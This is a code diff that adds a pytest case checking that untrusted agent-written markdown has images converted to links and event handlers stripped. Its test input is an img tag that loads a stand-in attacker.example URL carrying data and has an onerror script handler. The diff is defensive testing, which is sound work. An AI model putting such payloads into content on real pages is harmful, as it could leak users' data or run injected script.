@@ -69,7 +69,7 @@ ctx.window = ctx;
 vm.createContext(ctx);
 vm.runInContext(scenario.head, ctx);
 vm.runInContext(scenario.page, ctx);
-const results = scenario.calls.map(([name, arg]) => ctx[name](arg));
+const results = scenario.calls.map(([name, ...args]) => ctx[name](...args));
 process.stdout.write(JSON.stringify({
   results, sanitized, listHtml: elements['questions-list'].innerHTML,
 }));
@@ -152,6 +152,22 @@ class TestSharedMarkdownHelpers:
         out = _run(tmp_path, marked=marked, purify=purify, calls=[[helper, _QUESTION]])
 
         assert "<img" not in out["results"][0]
+
+    @pytest.mark.parametrize(
+        ("marked", "purify"),
+        [(True, True), (True, False), (False, True), (False, False)],
+        ids=["both-loaded", "no-dompurify", "no-marked", "neither"],
+    )
+    def test_untrusted_markdown_turns_an_image_into_a_link(self, tmp_path: Path, marked: bool, purify: bool) -> None:
+        """Agent prose: an image would load its URL on render, so it becomes a link (a DOMPurify without hooks too)."""
+        text = '<img src="https://attacker.example/?d=s" alt="x" onerror=alert(1)>'
+        out = _run(tmp_path, marked=marked, purify=purify, calls=[["renderMarkdown", text, {"untrusted": True}]])
+
+        result = out["results"][0]
+        assert "<img" not in result
+        if marked and purify:
+            assert '<a href="https://attacker.example/?d=s">x</a>' in result
+            assert "onerror" not in result
 
 
 class TestMarkedCallSites:
